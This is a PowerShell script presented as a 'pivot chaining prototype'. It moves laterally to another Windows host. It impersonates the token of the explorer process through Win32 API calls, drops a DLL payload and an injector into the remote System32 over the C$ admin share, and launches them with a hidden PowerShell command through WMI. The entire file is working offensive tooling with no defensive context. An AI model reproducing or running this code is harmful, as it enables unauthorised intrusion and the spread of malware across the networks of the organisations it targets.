# GhostPivot.ps1
# Multi-host pivot chaining prototype
# Leverages token impersonation and WMI to launch Whisper Suite on next host

param(
    [string]$NextHost,
    [string]$PayloadPath = "C:\\Windows\\System32\\GhostKey.dll",
    [string]$InjectorPath = "C:\\Windows\\System32\\WraithTap.exe"
)

function Invoke-TokenSteal {
    $proc = Get-Process | Where-Object { $_.ProcessName -like "explorer" } | Select-Object -First 1
    if (!$proc) { Write-Host "[-] No process found for token impersonation."; return $false }
    $procId = $proc.Id
    $sig = @'
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
        [DllImport("advapi32.dll")]
        public static extern bool OpenProcessToken(IntPtr proc, int access, out IntPtr token);
        [DllImport("advapi32.dll")]
        public static extern bool DuplicateToken(IntPtr token, int level, out IntPtr dup);
        [DllImport("advapi32.dll")]
        public static extern bool ImpersonateLoggedOnUser(IntPtr token);
'@
    Add-Type -MemberDefinition $sig -Name Native -Namespace Ghost
    $handle = [Ghost.Native]::OpenProcess(0x1F0FFF, $false, $procId)
    $tok = [IntPtr]::Zero
    $dup = [IntPtr]::Zero
    [Ghost.Native]::OpenProcessToken($handle, 2, [ref]$tok) | Out-Null
    [Ghost.Native]::DuplicateToken($tok, 2, [ref]$dup) | Out-Null
    return [Ghost.Native]::ImpersonateLoggedOnUser($dup)
}

function Push-Payload {
    $remotePath = "\\$NextHost\\C$\\Windows\\System32"
    try {
        Copy-Item -Path $PayloadPath -Destination "$remotePath\\GhostKey.dll" -Force
        Copy-Item -Path $InjectorPath -Destination "$remotePath\\WraithTap.exe" -Force
        Write-Host "[+] Payload dropped to $remotePath"
    } catch {
        Write-Host "[-] File drop failed: $_"
        return $false
    }
    return $true
}

function Trigger-Remote {
    $cmd = "powershell -w hidden -c \"Start-Process 'C:\\Windows\\System32\\WraithTap.exe' 'C:\\Windows\\System32\\GhostKey.dll'\""
    try {
        Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $NextHost -ArgumentList $cmd | Out-Null
        Write-Host "[+] Remote execution triggered on $NextHost"
    } catch {
        Write-Host "[-] Remote execution failed: $_"
    }
}

Write-Host "[*] Starting pivot to $NextHost..."
if (Invoke-TokenSteal) {
    if (Push-Payload) {
        Trigger-Remote
    }
} else {
    Write-Host "[-] Token impersonation failed."
}